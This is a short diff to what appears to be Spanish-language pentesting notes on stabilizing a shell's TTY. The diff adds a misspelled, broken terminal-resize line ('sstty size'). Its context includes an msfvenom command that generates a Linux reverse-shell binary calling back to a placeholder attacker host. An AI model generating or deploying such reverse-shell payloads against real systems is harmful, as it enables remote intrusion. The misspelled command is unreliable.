@@ -38,7 +38,8 @@ reset xterm
 #Obtener sesion tty
 export TERM=xterm
 #Si sigue habiendo algunos problemas habria que configurar la variable TERM para que sea xterm
-
+sstty size <colunnas> <filas>
+#reescalado de terminal de ser necesario
 
 ---     MSFvenom        ---
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=443 -f elf > file.elf
